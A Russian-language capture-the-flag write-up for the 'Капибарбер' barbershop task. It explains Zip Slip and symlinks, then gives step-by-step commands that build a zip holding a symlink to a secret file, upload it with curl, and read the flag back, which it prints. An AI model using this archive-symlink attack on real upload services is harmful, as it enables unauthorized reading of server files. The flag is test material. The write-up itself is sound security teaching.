## Капибарбер Write-Up

### Задачка

Капибарбершоп Лапы-ножницы выпустил свое приложение. Перед стрижкой клиенты загружают туда референсы, а капибарбер получает пошаговую схему работы.

Кто-то загрузил файл странного формата — и остальные референсы пропали. Теперь всем подряд стригут каре, капибарочки в шоке, а капибизнесмены гуглят магазины париков.

Разберитесь, что произошло, и по дороге забирайте файл flag.txt

Барбершоп Лапы-ножницы: t-barber-bi82zv7h.spbctf.org/

Исходники барбершопа: [barber_453fbf9.tar.gz](https://t-ctf.ru/files/barber_453fbf9.tar.gz)

### Теория

**Уязвимость Zip Slip** — это классическая уязвимость, связанная с извлечением архивов (например, ZIP), при котором злоумышленник может добиться записи файлов в произвольные директории за пределами ожидаемой папки.

Если при распаковке архива не проверяются пути, указанные в его файлах, можно создать архив, содержащий файл с путем вроде:

```bash
../../../../etc/passwd
```
И тогда при распаковке файл может быть записан в системную директорию (если есть права), что позволяет:

- перезаписать важные файлы,
- выполнить произвольный код,
- эскалировать привилегии.

**Симлинк (symbolic link)** — это ярлык на файл или папку в файловой системе. Он указывает на другой путь, как ссылка.

Пример: ln -s /real/path linkname — создаст симлинк linkname, ведущий на /real/path.

### Решение

![Скриншот 24 04 25_19 40 42](https://github.com/user-attachments/assets/c0b11875-ed98-45cc-b59a-7f723a7761cb)

Заходим на сайт и листаем ниже. Видим, что единственный интерактивный объект, с которым мы можем взаимодействовать — форма для загрузки картинки. Если картинка валидная, мы сможем её посмотреть.

![image](https://github.com/user-attachments/assets/61bf4f91-864a-4940-b451-895b2144ae93)

Посмотрев POST-запрос загрузки картинки в бурпе, увидим, что картинка складывается по адресу ../api/images/\[УНИКАЛЬНЫЙ ID]/\[НАЗВАНИЕ].jpg

![image](https://github.com/user-attachments/assets/6958bd3b-6fdf-4071-af6d-5a73af4a997d)


Далее лезем изучать исходный код. Нас интересует папка с бэкэндом. Там лежит `flag.txt` и `Dockerfile`. Открыв его, заметим следующую строчку: `COPY flag.txt /home/secret/flag.txt`. Отсюда узнаем путь до нужного нам флага. Теперь перейдем к созданию вредоносного архива.

1. Открываем терминал, указываем директорию и сперва создаем симлинк: `ln -s /home/secret/flag.txt flag.txt`.
2. Кладем в эту же папку совершенно рандомную картинку.
3. Создаем архив с симлинком `zip --symlinks exploit.zip image.jpg flag.txt`.
4. Отправляем на сайт POST-запрос через curl:
```bash
curl -X POST https://t-barber-bi82zv7h.spbctf.org/api/upload \
-F "file=@exploit.zip" \
-b "__cfduid=3d63d46b2355a43ff1fe30687b5f1f09" \
-v
```
5. В ответе получаем путь: `api/images/875401ed-61d3-48cd-b245-e44a6ee24ef7/flag.txt`
6. Добавляем путь к нашей ссылке: `https://t-barber-bi82zv7h.spbctf.org/api/images/875401ed-61d3-48cd-b245-e44a6ee24ef7/flag.txt`
7. Получаем флаг: `tctf{5ci55orHandS_4RE_B4CK_In_BUSInE55}`



